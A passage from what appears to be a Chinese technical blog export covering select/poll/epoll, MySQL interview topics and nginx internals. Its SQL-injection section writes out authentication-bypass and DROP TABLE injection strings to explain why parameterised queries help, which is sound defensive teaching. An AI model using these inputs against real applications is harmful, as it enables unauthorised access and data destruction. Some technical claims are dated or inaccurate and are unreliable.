2、怎么解决上面的问题？老师找个班长，班长负责收作业，班长的做法是：遍历问学生作业写好了吗，写好的，收起来交给老师。休息一会，再去遍历。。。这个班长就是select。 存在问题 这个班长还有一个能力问题，最多只能管理1024个学生。 很多学生的作业没有写好，而且短时间写不好，班长还是不停地遍历去问，影响效率。 怎么解决问题1班长的能力问题？ 换一个能力更强的班长，可以管理更多的学生，这个班长就是poll。 怎么解决问题1、2，存在的能力问题和效率问题？ 换一个能力超级强的班长，可以管理无限多的学生，同时班长的做法是：遍历一次所有的学生，如果作业没有写完，告诉学生写好之后，放在一个固定的地方。这样的话，班长只需要定期到这个地方取作业就好了。这就是epoll。 转自： socket 最后的对比参考： https://www.cnblogs.com/java2016/p/5538018.html]]></content>
      <tags>
        <tag>计算机网络及其他</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mysql面试高频理论知识]]></title>
    <url>%2F2018%2F07%2F21%2Fmysql%E9%9D%A2%E8%AF%95%E9%AB%98%E9%A2%91%E7%90%86%E8%AE%BA%E7%9F%A5%E8%AF%86%2F</url>
    <content type="text"><![CDATA[对比较重要的mysql面试题进行汇总。 1. 数据库三范式1.1 范式是什么范式就是规范，要满足第二范式必须先满足第一范式，要满足第三范式，必须要先满足第二范式。 1NF(第一范式)：列数据不可分割，即一列不能有多个值2NF(第二范式)：主键(每一行都有唯一标识)3NF(第三范式)：外键(表中不包含已在其他表中包含的非主关键信息) 1.2 反三范式反三范式：有时为了效率，可以设置重复或者推导出的字段，例如：订单总价格订单项的单价，这个订单总价虽然可以由订单项计算出来，但是当订单数目庞大时，效率比较低，所以订单的总价这个字段是必要的。 2. 事务2.1 含义事务时并发控制的单位，是用户定义的一个操作序列，要么都做，要么都不做，是不可分割的工作单位。 2.2 事务的四个特征(ACID特性) 原子性：表示事务内操作不可分割 一致性：要么成功，要么失败，若后面失败，前面则回滚 隔离性：一个事务开始了，不被其他事务干扰 持久性：事务开始了，就不能突然终止 3. mysql数据库默认最大连接数3.1 为什么需要最大连接数特定服务器上的数据库只能支持一定数目同时连接，这时需要我们设置最大连接数（最多同时服务多少连接）。在数据库安装时会有一个默认的最大连接数。 my.ini中max_connections=100 4. 分页4.1 为什么需要分页？在很多数据时，不可能完全显示数据。进行分段显示. 4.2 mysql如何分页12String sql = "select * from students order by id limit " + pageSize*(pageNumber-1) + "," + pageSize; 4.3 oracle分页是使用了三层嵌套查询。1234String sql = &quot;select * from &quot; + (select *,rownum rid from (select * from students order by postime desc) where rid&lt;=&quot; + pagesize*pagenumber + &quot;) as t&quot; + &quot;where t&gt;&quot; + pageSize*(pageNumber-1); 5. 触发器略。 6. 存储过程6.1 数据库存储过程具有如下优点： 1、存储过程只在创建时进行编译，以后每次执行存储过程都不需再重新编译，而一般 SQL 语句每执行一次就编译一次，因此使用存储过程可以大大提高数据库执行速度。 2、通常，复杂的业务逻辑需要多条 SQL 语句。这些语句要分别地从客户机发送到服务器，当客户机和服务器之间的操作很多时，将产生大量的网络传输。如果将这些操作放在一个存储过程中，那么客户机和服务器之间的网络传输就会大大减少，降低了网络负载。 3、存储过程创建一次便可以重复使用，从而可以减少数据库开发人员的工作量。 4、安全性高，存储过程可以屏蔽对底层数据库对象的直接访问，使用 EXECUTE 权限调用存储过程，无需拥有访问底层数据库对象的显式权限。 6.2 定义存储过程:12345678create procedure insert_Student (_name varchar(50),_age int ,out _id int)begin insert into student value(null,_name,_age); select max(stuId) into _id from student;end;call insert_Student('wfz',23,@id);select @id; 7. 用jdbc怎么调用存储过程？ 贾琏欲执事 加载驱动 获取连接 设置参数 执行 释放连接 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849import java.sql.CallableStatement;import java.sql.Connection;import java.sql.DriverManager;import java.sql.SQLException;import java.sql.Types;public class JdbcTest &#123; /** * @param args */ public static void main(String[] args) &#123; // TODO Auto-generated method stub Connection cn = null; CallableStatement cstmt = null; try &#123; //这里最好不要这么干，因为驱动名写死在程序中了 Class.forName("com.mysql.jdbc.Driver"); //实际项目中，这里应用DataSource数据，如果用框架， //这个数据源不需要我们编码创建，我们只需Datasource ds = context.lookup() //cn = ds.getConnection(); cn = DriverManager.getConnection("jdbc:mysql:///test","root","root"); cstmt = cn.prepareCall("&#123;call insert_Student(?,?,?)&#125;"); cstmt.registerOutParameter(3,Types.INTEGER); cstmt.setString(1, "wangwu"); cstmt.setInt(2, 25); cstmt.execute(); //get第几个，不同的数据库不一样，建议不写 System.out.println(cstmt.getString(3)); &#125; catch (Exception e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125; finally &#123; /*try&#123;cstmt.close();&#125;catch(Exception e)&#123;&#125; try&#123;cn.close();&#125;catch(Exception e)&#123;&#125;*/ try &#123; if(cstmt != null) cstmt.close(); if(cn != null) cn.close(); &#125; catch (SQLException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125; &#125; &#125; 8. 对jdbc的理解Java database connection java数据库连接.数据库管理系统(mysql oracle等)是很多，每个数据库管理系统支持的命令是不一样的。 Java只定义接口，让数据库厂商自己实现接口，对于我们者而言。只需要导入对应厂商开发的实现即可。然后以接口方式进行调用.(mysql + mysql驱动（实现）+jdbc) 9. 写一个简单的jdbc的程序。写一个访问oracle数据的jdbc程序 贾琏欲执事 加载驱动(com.mysql.jdbc.Driver,oracle.jdbc.driver.OracleDriver) 取连接(DriverManager.getConnection(url,usernam,passord)) 设置参数 Statement PreparedStatement,cstmt.setXXX(index, value); 执行 executeQuery executeUpdate 释放连接(是否连接要从小到大，必须放到finnaly) 10. JDBC中的PreparedStatement相比Statement的好处大多数我们都使用PreparedStatement代替Statement 1：PreparedStatement是预编译的，比Statement速度快 2：代码的可读性和可维护性 虽然用PreparedStatement来代替Statement会使代码多出几行,但这样的代码无论从可读性还是可维护性上来说.都比直接用Statement的代码高很多档次： 123456789stmt.executeUpdate("insert into tb_name (col1,col2,col2,col4) values('"+var1+"','"+var2+"',"+var3+",'"+var4+"')"); perstmt = con.prepareStatement("insert into tb_name (col1,col2,col2,col4) values (?,?,?,?)");perstmt.setString(1,var1);perstmt.setString(2,var2);perstmt.setString(3,var3);perstmt.setString(4,var4);perstmt.executeUpdate(); 3：安全性 PreparedStatement可以防止SQL注入攻击，而Statement却不能。 比如说： String sql = “select * from tb_name where name= ‘“+varname+”‘ and passwd=’”+varpasswd+”‘“; 如果我们把[&#39; or &#39;1&#39; = &#39;1]作为varpasswd传入进来.用户名随意,看看会成为什么? select * from tb_name = ‘随意’ and passwd = ‘’ or ‘1’ = ‘1’; 因为&#39;1&#39;=&#39;1&#39;肯定成立，所以可以任何通过验证。 更有甚者：把[&#39;;drop table tb_name;]作为varpasswd传入进来,则： select * from tb_name = ‘随意’ and passwd = ‘’;drop table tb_name; 有些数据库是不会让你成功的，但也有很多数据库就可以使这些语句得到执行。 而如果你使用预编译语句你传入的任何内容就不会和原来的语句发生任何匹配的关系，只要全使用预编译语句你就用不着对传入的数据做任何过虑。而如果使用普通的statement,有可能要对drop等做费尽心机的判断和过虑。 11. 数据库连接池作用 1、限定数据库的个数，不会导致由于数据库连接过多导致系统运行缓慢或崩溃 2、数据库连接不需要每次都去创建或销毁，节约了资源 3、数据库连接不需要每次都去创建，响应时间更快。 12. 选择合适的存储引擎在开发中，我们经常使用的存储引擎 myisam / innodb/ memory MyISAM存储引擎 如果表对事务要求不高，同时是以查询和添加为主的，我们考虑使用myisam存储引擎. 比如 bbs 中的 发帖表，回复表. INNODB存储引擎: 对事务要求高，保存的数据都是重要数据，我们建议使用INNODB,比如订单表，账号表. Memory 存储 我们数据变化频繁，不需要入库，同时又频繁的查询和修改，我们考虑使用memory, 速度极快. MyISAM 和 INNODB的区别(主要) 事务安全 myisam不支持事务而innodb支持 查询和添加速度 myisam不用支持事务就不用考虑同步锁，查找和添加和添加的速度快 支持全文索引 myisam支持innodb不支持 锁机制 myisam支持表锁而innodb支持行锁(事务) 外键 MyISAM 不支持外键， INNODB支持外键. (通常不设置外键，通常是在程序中保证数据的一致) 下面是数据库的优化手段，但是只是表面，需要以后再好好探究在项目自验项目转测试之前，在启动mysql数据库时开启慢查询，并且把执行慢的语句写到日志中，在运行一定时间后。通过查看日志找到慢查询语句。 1234567891011121314151617181920212223242526272829show variables like '%slow%'; #查看MySQL慢查询是否开启set global slow_query_log=ON; #开启MySQL慢查询功能show variables like "long_query_time"; #查看MySQL慢查询时间设置，默认10秒set global long_query_time=5; #修改为记录5秒内的查询select sleep(6); #测试MySQL慢查询show variables like "%slow%"; #查看MySQL慢查询日志路径show global status like '%slow%'; #查看MySQL慢查询状态或者vi /etc/my.cnf #编辑，在[mysqld]段添加以下代码slow-query-log = on #开启MySQL慢查询功能slow_query_log_file = /var/run/mysqld/mysqld-slow.log #设置MySQL慢查询日志路径long_query_time = 5 #修改为记录5秒内的查询，默认不设置此参数为记录10秒内的查询log-queries-not-using-indexes = on #记录未使用索引的查询:wq! #保存退出service mysqld restart #重启MySQL服务 13. 数据库优化-索引13.1 索引的概念索引（Index）是帮助DBMS高效获取数据的数据结构。 13.2 索引有哪些 分类：普通索引/唯一索引/主键索引/全文索引 普通索引:允许重复的值出现 唯一索引:除了不能有重复的记录外，其它和普通索引一样(用户名、用户身份证、email,tel) 主键索引：是随着设定主键而创建的，也就是把某个列设为主键的时候，数据库就会給改列创建索引。这就是主键索引.唯一且没有null值 全文索引:用来对表中的文本域(char，varchar，text)进行索引， 全文索引针对MyIsamexplain select * from articles where match(title,body) against(‘database’);【会使用全文索引】 13.3 使用索引的注意事项 索引弊端 占用磁盘空间。 对dml(插入、修改、删除)操作有影响，变慢。 使用场景 肯定在where条件经常使用,如果不做查询就没有意义 该字段的内容不是唯一的几个值(sex) 字段内容不是频繁变化. 注意事项 对于创建的多列索引（复合索引），不是使用的第一部分就不会使用索引。 123alter table dept add index my_ind (dname,loc); // dname 左边的列,loc就是右边的列explain select * from dept where dname='aaa'\G 会使用到索引explain select * from dept where loc='aaa'\G 就不会使用到索引 对于使用like的查询，查询如果是%aaa不会使用到索引而aaa%会使用到索引。 12explain select * from dept where dname like '%aaa'\G不能使用索引explain select * from dept where dname like 'aaa%'\G使用索引. 所以在like查询时，‘关键字’的最前面不能使用% 或者 _这样的字符，如果一定要前面有变化的值，则考虑使用 全文索引-&gt;sphinx. 索引列排序 MySQL查询只使用一个索引，因此如果where子句中已经使用了索引的话，那么order by中的列是不会使用索引的。因此数据库默认排序可以符合要求的情况下不要使用排序操作；尽量不要包含多个列的排序，如果需要最好给这些列创建复合索引。 如果列类型是字符串，那一定要在条件中将数据使用引号引用起来。否则不使用索引。 123expain select * from dept where dname=’111’;expain select * from dept where dname=111;（数值自动转字符串）expain select * from dept where dname=qqq;报错 也就是，如果列是字符串类型，无论是不是字符串数字就一定要用 ‘’ 把它包括起来. 如果mysql估计使用全表扫描要比使用索引快，则不使用索引。表里面只有一条记录 索引不会包含有NULL值的列 只要列中包含有NULL值都将不会被包含在MySQL索引中，复合索引中只要有一列含有NULL值，那么这一列对于此复合索引就是无效的。所以我们在数据库设计时不要让字段的默认值为NULL。 使用短索引 对串列进行索引，如果可能应该指定一个前缀长度。例如，如果有一个CHAR(255)的列，如果在前10个或20个字符内，多数值是惟一的，那么就不要对整个列进行索引。短索引不仅可以提高查询速度而且可以节省磁盘空间和I/O操作。 不要在列上进行运算，不使用NOT IN和&lt;&gt;操作，不支持正则表达式。 14. 数据库优化-分表分表分为水平(按行)分表和垂直(按列)分表 水平分表情形： 根据经验，Mysql表数据一般达到百万级别，查询效率会很低，容易造成表锁，甚至堆积很多连接，直接挂掉；水平分表能够很大程度较少这些压力。 垂直分表情形： 如果一张表中某个字段值非常多(长文本、二进制等)，而且只有在很少的情况下会查询。这时候就可以把字段多个单独放到一个表，通过外键关联起来。考试详情，一般我们只关注分数，不关注详情。 水平分表策略： 1.按时间分表 这种分表方式有一定的局限性，当数据有较强的实效性，如微博发送记录、微信消息记录等，这种数据很少有用户会查询几个月前的数据，如需要就可以按月分表。 2.按区间范围分表 一般在有严格的自增id需求上，如按照user_id水平分表： 123table_1 user_id从1~100w table_2 user_id从101~200w table_3 user_id从201~300w 3.hash分表 通过一个原始目标的ID或者名称通过一定的hash算法计算出数据存储表的表名，然后访问相应的表。 15. 数据库优化-读写分离一台数据库支持的最大并发连接数是有限的，如果用户并发访问太多。一台服务器满足不要要求是就可以集群处理。Mysql的集群处理技术最常用的就是读写分离。 主从同步 数据库最终会把数据持久化到磁盘，如果集群必须确保每个数据库服务器的数据是一直的。能改变数据库数据的操作都往主数据库去写，而其他的数据库从主数据库上同步数据。 读写分离 使用负载均衡来实现写的操作都往主数据去，而读的操作往从服务器去。 16. 数据库优化-缓存什么是缓存 在持久层(dao)和数据库(db)之间添加一个缓存层，如果用户访问的数据已经缓存起来时，在用户访问时直接从缓存中获取，不用访问数据库。而缓存是在操作内存级，访问速度快。 作用 减少数据库服务器压力，减少访问时间。 Java中常用的缓存有 hibernate的二级缓存。该缓存不能完成分布式缓存。 可以使用redis(memcahe等)来作为中央缓存。对缓存的数据进行集中处理 17. 数据库优化-sql语句优化的技巧DDL优化 通过禁用索引来提供导入数据性能，这个操作主要针对现有数据库的表追加数据 123456//去除键alter table test3 DISABLE keys;//批量插入数据insert into test3 ***//恢复键alter table test3 ENABLE keys; 关闭唯一校验 12set unique_checks=0 关闭set unique_checks=1 开启 修改事务提交方式(导入)（变多次提交为一次） 123set autocommit=0 关闭//批量插入set autocommit=1 开启 DML优化（变多次提交为一次）12345insert into test values(1,2);insert into test values(1,3);insert into test values(1,4);//合并多条为一条insert into test values(1,2),(1,3),(1,4) DQL优化 Order by优化 多用索引排序 普通结果排序（非索引排序）Filesort group by优化 使用order by null,取消默认排序 等等等等… 18. jdbc批量插入几百万数据怎么实现1、变多次提交为一次2、使用批量操作3、像这样的批量插入操作能不使用代码操作就不使用，可以使用存储过程来实现 mysql优化手段介绍到这里。19. 聚簇索引和非聚簇索引索引分为聚簇索引和非聚簇索引。 “聚簇索引” 以一本英文课本为例，要找第8课，直接翻书，若先翻到第5课，则往后翻，再翻到第10课，则又往前翻。这本书本身就是一个索引，即“聚簇索引”。 “非聚簇索引” 如果要找”fire”这个单词，会翻到书后面的附录，这个附录是按字母排序的，找到F字母那一块，再找到”fire”，对应的会是它在第几课。这个附录，为“非聚簇索引”。 由此可见，聚簇索引，索引的顺序就是数据存放的顺序，所以，很容易理解，一张数据表只能有一个聚簇索引。 聚簇索引要比非聚簇索引查询效率高很多，特别是范围查询的时候。所以，至于聚簇索引到底应该为主键，还是其他字段，这个可以再讨论。 1、MYSQL的索引mysql中，不同的存储引擎对索引的实现方式不同，大致说下MyISAM和InnoDB两种存储引擎。 MyISAM存储引擎的索引实现 MyISAM的B+Tree的叶子节点上的data，并不是数据本身，而是数据存放的地址。主索引和辅助索引没啥区别，只是主索引中的key一定得是唯一的。这里的索引都是非聚簇索引。MyISAM还采用压缩机制存储索引，比如，第一个索引为“her”，第二个索引为“here”，那么第二个索引会被存储为“3,e”，这样的缺点是同一个节点中的索引只能采用顺序查找。 InnoDB存储引擎的索引实现 InnoDB 的数据文件本身就是索引文件，B+Tree的叶子节点上的data就是数据本身，key为主键，这是聚簇索引。非聚簇索引，叶子节点上的data是主键 (所以聚簇索引的key，不能过长)。为什么存放的主键，而不是记录所在地址呢，理由相当简单，因为记录所在地址并不能保证一定不会变，但主键可以保证。至于为什么主键通常建议使用自增id呢？ 2.聚簇索引聚簇索引的数据的物理存放顺序与索引顺序是一致的，即：只要索引是相邻的，那么对应的数据一定也是相邻地存放在磁盘上的。如果主键不是自增id，那么可以想 象，它会干些什么，不断地调整数据的物理地址、分页，当然也有其他一些措施来减少这些操作，但却无法彻底避免。但，如果是自增的，那就简单了，它只需要一 页一页地写，索引结构相对紧凑，磁盘碎片少，效率也高。 聚簇索引不但在检索上可以大大滴提高效率，在数据读取上也一样。比如：需要查询f~t的所有单词。 一个使用MyISAM的主索引，一个使用InnoDB的聚簇索引。两种索引的B+Tree检索时间一样，但读取时却有了差异。 因为MyISAM的主索引并非聚簇索引，那么他的数据的物理地址必然是凌乱的，拿到这些物理地址，按照合适的算法进行I/O读取，于是开始不停的寻道不停的旋转。聚簇索引则只需一次I/O。 不过，如果涉及到大数据量的排序、全表扫描、count之类的操作的话，还是MyISAM占优势些，因为索引所占空间小，这些操作是需要在内存中完成的。 鉴于聚簇索引的范围查询效率，很多人认为使用主键作为聚簇索引太多浪费，毕竟几乎不会使用主键进行范围查询。但若再考虑到聚簇索引的存储，就不好定论了。 20. sql注入问题20.1 什么是sql注入sql注入大家都不陌生，是一种常见的攻击方式，攻击者在界面的表单信息或url上输入一些奇怪的sql片段，例如“or ‘1’=’1’”这样的语句，有可能入侵参数校验不足的应用程序。所以在我们的应用中需要做一些工作，来防备这样的攻击方式。在一些安全性很高的应用中，比如银行软件，经常使用将sql语句全部替换为存储过程这样的方式，来防止sql注入，这当然是一种很安全的方式，但我们平时开发中，可能不需要这种死板的方式。 20.2 PrepareStatement解决SQL注入的问题在使用JDBC的过程中，可以使用PrepareStatement进行预处理，预处理的优势就是预防绝大多数的SQL注入；而且针对多次操作数据库的情况，可以极大的提高访问数据库的效率。 那为什么它这样处理就能预防SQL注入提高安全性呢？其实是因为SQL语句在程序运行前已经进行了预编译。在程序运行时第一次操作数据库之前，SQL语句已经被数据库分析，编译和优化，对应的执行计划也会缓存下来并允许数据库以参数化的形式进行查询。当运行时动态地把参数传给PreprareStatement时，即使参数里有敏感字符如 or ‘1=1’，数据库也会作为一个参数一个字段的属性值来处理而不会作为一个SQL指令。如此，就起到了SQL注入的作用了！ 20.3 MyBatis如何防止sql注入mybatis框架作为一款半自动化的持久层框架，其sql语句都要我们自己来手动编写，这个时候当然需要防止sql注入。其实Mybatis的sql是一个具有“输入+输出”功能，类似于函数的结构，如下： 12345&lt;select id=“getBlogById“ resultType=“Blog“ parameterType=”int”&gt; select id,title,author,content from blog where id=#&#123;id&#125; &lt;/select&gt; 这里，parameterType标示了输入的参数类型，resultType标示了输出的参数类型。回应上文，如果我们想防止sql注入，理所当然地要在输入参数上下功夫。上面代码中“#{id}”即输入参数在sql中拼接的部分，传入参数后，打印出执行的sql语句，会看到sql是这样的： select id,title,author,content from blog where id = ? 不管输入什么参数，打印出的sql都是这样的。这是因为mybatis启用了预编译功能，在sql执行前，会先将上面的sql发送给数据库进行编译，执行时，直接使用编译好的sql，替换占位符“？”就可以了。因为sql注入只能对编译过程起作用，所以这样的方式就很好地避免了sql注入的问题。 mybatis是如何做到sql预编译的呢？其实在框架底层，是jdbc中的PreparedStatement类在起作用，PreparedStatement是我们很熟悉的Statement的子类，它的对象包含了编译好的sql语句。这种“准备好”的方式不仅能提高安全性，而且在多次执行一个sql时，能够提高效率，原因是sql已编译好，再次执行时无需再编译。 补充 12345&lt;select id=“orderBlog“ resultType=“Blog“ parameterType=”map”&gt; select id,title,author,content from blog order by $&#123;orderParam&#125; &lt;/select&gt; 仔细观察，内联参数的格式由“#{xxx}”变为了${xxx}。如果我们给参数“orderParam”赋值为”id”,将sql打印出来，是这样的： select id,title,author,content from blog order by id 显然，这样是无法阻止sql注入的。在mybatis中，”${xxx}”这样格式的参数会直接参与sql编译，从而不能避免注入攻击。但涉及到动态表名和列名时，只能使用“${xxx}”这样的参数格式，所以，这样的参数需要我们在代码中手工进行处理来防止注入。 21. mysql悲观锁和乐观锁21.1 悲观锁悲观锁（Pessimistic Lock），顾名思义，就是很悲观，每次去拿数据的时候都认为别人会修改，所以每次在拿数据的时候都会上锁，这样别人想拿这个数据就会block直到它拿到锁。 悲观锁：假定会发生并发冲突，屏蔽一切可能违反数据完整性的操作。 Java synchronized 就属于悲观锁的一种实现，每次线程要修改数据时都先获得锁，保证同一时刻只有一个线程能操作数据，其他线程则会被block。 21.2 乐观锁乐观锁（Optimistic Lock），顾名思义，就是很乐观，每次去拿数据的时候都认为别人不会修改，所以不会上锁，但是在提交更新的时候会判断一下在此期间别人有没有去更新这个数据。乐观锁适用于读多写少的应用场景，这样可以提高吞吐量。 乐观锁：假设不会发生并发冲突，只在提交操作时检查是否违反数据完整性。 乐观锁一般来说有以下2种方式： 使用数据版本（Version）记录机制实现，这是乐观锁最常用的一种实现方式。何谓数据版本？即为数据增加一个版本标识，一般是通过为数据库表增加一个数字类型的 version 字段来实现。当读取数据时，将version字段的值一同读出，数据每更新一次，对此version值加一。当我们提交更新的时候，判断数据库表对应记录的当前版本信息与第一次取出来的version值进行比对，如果数据库表当前版本号与第一次取出来的version值相等，则予以更新，否则认为是过期数据。 使用时间戳（timestamp）。乐观锁定的第二种实现方式和第一种差不多，同样是在需要乐观锁控制的table中增加一个字段，名称无所谓，字段类型使用时间戳（timestamp）, 和上面的version类似，也是在更新提交的时候检查当前数据库中数据的时间戳和自己更新前取到的时间戳进行对比，如果一致则OK，否则就是版本冲突。Java JUC中的atomic包就是乐观锁的一种实现，AtomicInteger 通过CAS（Compare And Set）操作实现线程安全的自增。]]></content>
      <tags>
        <tag>Mysql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nginx原理]]></title>
    <url>%2F2018%2F07%2F21%2Fnginx%E5%8E%9F%E7%90%86%2F</url>
    <content type="text"><![CDATA[Nginx是一个高性能的HTTP和反向代理服务器，及电子邮件（IMAP/POP3）代理服务器，同时也是一个非常高效的反向代理、负载平衡中间件。是非常常用的web server. 1.正向代理和反向代理 正向代理的工作原理就像一个跳板，比如：我访问不了google.com，但是我能访问一个代理服务器A，A能访问google.com，于是我先连上代理服务器A，告诉他我需要google.com的内容，A就去取回来，然后返回给我。从网站的角度，只在代理服务器来取内容的时候有一次记录，有时候并不知道是用户的请求，也隐藏了用户的资料，这取决于代理告不告诉网站。 反向代理（Reverse Proxy）方式是指以代理服务器来接受internet上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给internet上请求连接的客户端，此时代理服务器对外就表现为一个服务器。 简单来说： 正向代理是不知道客户端是谁，代理是一个跳板，所有客户端通过这个跳板来访问到对应的内容。 反向代理是不知道服务端是谁，用户的请求被转发到内部的某台服务器去处理。 2.基本的工作流程 用户通过域名发出访问Web服务器的请求，该域名被DNS服务器解析为反向代理服务器的IP地址； 反向代理服务器接受用户的请求； 反向代理服务器在本地缓存中查找请求的内容，找到后直接把内容发送给用户； 如果本地缓存里没有用户所请求的信息内容，反向代理服务器会代替用户向源服务器请求同样的信息内容，并把信息内容发给用户，如果信息内容是缓存的还会把它保存到缓存中。 3.优点 保护了真实的web服务器，保证了web服务器的资源安全 节约了有限的IP地址资源 减少WEB服务器压力，提高响应速度(缓存功能) 请求的统一控制，包括设置权限、过滤规则等 实现负载均衡 区分动态和静态可缓存内容 …… 4.实用场景 Nginx作为Http代理、反向代理 Nginx作为负载均衡器 Ip hash算法，对客户端请求的ip进行hash操作，然后根据hash结果将同一个客户端ip的请求分发给同一台服务器进行处理，可以解决session不共享的问题。 Nginx作为Web缓存 5.Nginx的Master-Worker模式 启动Nginx后，其实就是在80端口启动了Socket服务进行监听，如图所示，Nginx涉及Master进程和Worker进程。 Master进程的作用是？读取并验证配置文件nginx.conf；管理worker进程； 接收来自外界的信号 向各worker进程发送信号 监控worker进程的运行状态，当worker进程退出后(异常情况下)，会自动重新启动新的worker进程 Worker进程的作用是？每一个Worker进程都维护一个线程（避免线程切换），处理连接和请求；注意Worker进程的个数由配置文件决定，一般和CPU个数相关（有利于进程切换），配置几个就有几个Worker进程。 nginx用一个独立的worker进程来处理一个请求，一个worker进程可以处理多个请求。 思考：Nginx如何做到热部署？ 所谓热部署，就是配置文件nginx.conf修改后，不需要stop Nginx，不需要中断请求，就能让配置文件生效！（nginx -s reload 重新加载/nginx -t检查配置/nginx -s stop） 通过上文我们已经知道worker进程负责处理具体的请求，那么如果想达到热部署的效果，可以想象： 方案一： 修改配置文件nginx.conf后，主进程master负责推送给woker进程更新配置信息，woker进程收到信息后，更新进程内部的线程信息。（有点valatile的味道） 方案二： 修改配置文件nginx.conf后，重新生成新的worker进程，当然会以新的配置进行处理请求，而且新的请求必须都交给新的worker进程，至于老的worker进程，等把那些以前的请求处理完毕后，kill掉即可。 Nginx采用的就是方案二来达到热部署的！ 思考：Nginx如何做到高并发下的高效处理？ 上文已经提及Nginx的worker进程个数与CPU绑定、worker进程内部包含一个线程高效回环处理请求，这的确有助于效率，但这是不够的。 作为专业的程序员，我们可以开一下脑洞：BIO/NIO/AIO、异步/同步、阻塞/非阻塞… 要同时处理那么多的请求，要知道，有的请求需要发生IO，可能需要很长时间，如果等着它，就会拖慢worker的处理速度。 Nginx采用了Linux的epoll模型，epoll模型基于事件驱动机制，它可以监控多个事件是否准备完毕，如果OK，那么放入epoll队列中，这个过程是异步的。worker只需要从epoll队列循环处理即可。 思考：Nginx挂了怎么办？ Nginx既然作为入口网关，很重要，如果出现单点问题，显然是不可接受的。 答案是：Keepalived+Nginx实现高可用。 Keepalived是一个高可用解决方案，主要是用来防止服务器单点发生故障，可以通过和Nginx配合来实现Web服务的高可用。（其实，Keepalived不仅仅可以和Nginx配合，还可以和很多其他服务配合） Keepalived+Nginx实现高可用的思路： 第一：请求不要直接打到Nginx上，应该先通过Keepalived（这就是所谓虚拟IP，VIP） 第二：Keepalived应该能监控Nginx的生命状态（提供一个用户自定义的脚本，定期检查Nginx进程状态，进行权重变化,，从而实现Nginx故障切换） 6.nginx.conf 第一：location可以进行正则匹配，应该注意正则的几种形式以及优先级。（这里不展开） 第二：Nginx能够提高速度的其中一个特性就是：动静分离，就是把静态资源放到Nginx上，由Nginx管理，动态请求转发给后端。 第三：我们可以在Nginx下把静态资源、日志文件归属到不同域名下（也即是目录），这样方便管理维护。 第四：Nginx可以进行IP访问控制，有些电商平台，就可以在Nginx这一层，做一下处理，内置一个黑名单模块，那么就不必等请求通过Nginx达到后端在进行拦截，而是直接在Nginx这一层就处理掉。 除了可以映射静态资源，上面已经说了，可以作为一个代理服务器来使用。 所谓反向代理，很简单，其实就是在location这一段配置中的root替换成proxy_pass即可。root说明是静态资源，可以由Nginx进行返回；而proxy_pass说明是动态请求，需要进行转发，比如代理到Tomcat上。 反向代理，上面已经说了，过程是透明的，比如说request -&gt; Nginx -&gt; Tomcat，那么对于Tomcat而言，请求的IP地址就是Nginx的地址，而非真实的request地址，这一点需要注意。不过好在Nginx不仅仅可以反向代理请求，还可以由用户自定义设置HTTP HEADER。 负载均衡【upstream】 上面的反向代理中，我们通过proxy_pass来指定Tomcat的地址，很显然我们只能指定一台Tomcat地址，那么我们如果想指定多台来达到负载均衡呢？ 第一，通过upstream来定义一组Tomcat，并指定负载策略（IPHASH、加权论调、最少连接），健康检查策略（Nginx可以监控这一组Tomcat的状态）等。 第二，将proxy_pass替换成upstream指定的值即可。 负载均衡可能带来的问题？ 负载均衡所带来的明显的问题是，一个请求，可以到A server，也可以到B server，这完全不受我们的控制，当然这也不是什么问题，只是我们得注意的是：用户状态的保存问题，如Session会话信息，不能在保存到服务器上。 7.惊群现象定义：惊群效应就是当一个fd的事件被触发时，所有等待这个fd的线程或进程都被唤醒。 Nginx的IO通常使用epoll，epoll函数使用了I/O复用模型。与I/O阻塞模型比较，I/O复用模型的优势在于可以同时等待多个（而不只是一个）套接字描述符就绪。Nginx的epoll工作流程如下： master进程先建好需要listen的socket后，然后再fork出多个woker进程，这样每个work进程都可以去accept这个socket 当一个client连接到来时，所有accept的work进程都会受到通知，但只有一个进程可以accept成功，其它的则会accept失败，Nginx提供了一把共享锁accept_mutex来保证同一时刻只有一个work进程在accept连接，从而解决惊群问题 当一个worker进程accept这个连接后，就开始读取请求，解析请求，处理请求，产生数据后，再返回给客户端，最后才断开连接，这样一个完成的请求就结束了 8.Nginx架构及工作流程 Nginx真正处理请求业务的是Worker之下的线程。worker进程中有一个ngx_worker_process_cycle()函数，执行无限循环，不断处理收到的来自客户端的请求，并进行处理，直到整个Nginx服务被停止。 当一个 worker 进程在 accept() 这个连接之后，就开始读取请求，解析请求，处理请求，产生数据后，再返回给客户端，最后才断开连接，一个完整的请求。一个请求，完全由 worker 进程来处理，而且只能在一个 worker 进程中处理。 这样做带来的好处： 节省锁带来的开销。每个 worker 进程都是独立的进程，不共享资源，不需要加锁。同时在编程以及问题查上时，也会方便很多。 独立进程，减少风险。采用独立的进程，可以让互相之间不会影响，一个进程退出后，其它进程还在工作，服务不会中断，master 进程则很快重新启动新的 worker 进程。当然，worker 进程的也能发生意外退出。 9.nginx为什么高性能因为nginx是多进程单线程的代表，多进程模型每个进程/线程只能处理一路IO，那么 Nginx是如何处理多路IO呢？ 如果不使用 IO 多路复用，那么在一个进程中，同时只能处理一个请求，比如执行 accept()，如果没有连接过来，那么程序会阻塞在这里，直到有一个连接过来，才能继续向下执行。 而多路复用，允许我们只在事件发生时才将控制返回给程序，而其他时候内核都挂起进程，随时待命。 核心：Nginx采用的 IO多路复用模型epoll epoll通过在Linux内核中申请一个简易的文件系统（文件系统一般用什么数据结构实现？B+树），其工作流程分为三部分： 调用 int epoll_create(int size)建立一个epoll对象，内核会创建一个eventpoll结构体，用于存放通过epoll_ctl()向epoll对象中添加进来的事件，这些事件都会挂载在红黑树中。 调用 int epoll_ctl(int epfd, int op, int fd, struct epoll_event *event) 在 epoll 对象中为 fd 注册事件，所有添加到epoll中的事件都会与设备驱动程序建立回调关系，也就是说，当相应的事件发生时会调用这个sockfd的回调方法，将sockfd添加到eventpoll 中的双链表 调用 int epoll_wait(int epfd, struct epoll_event * events, int maxevents, int timeout) 来等待事件的发生，timeout 为 -1 时，该调用会阻塞直到有事件发生 这样，注册好事件之后，只要有 fd 上事件发生，epoll_wait() 就能检测到并返回给用户，用户就能”非阻塞“地进行 I/O 了。 epoll() 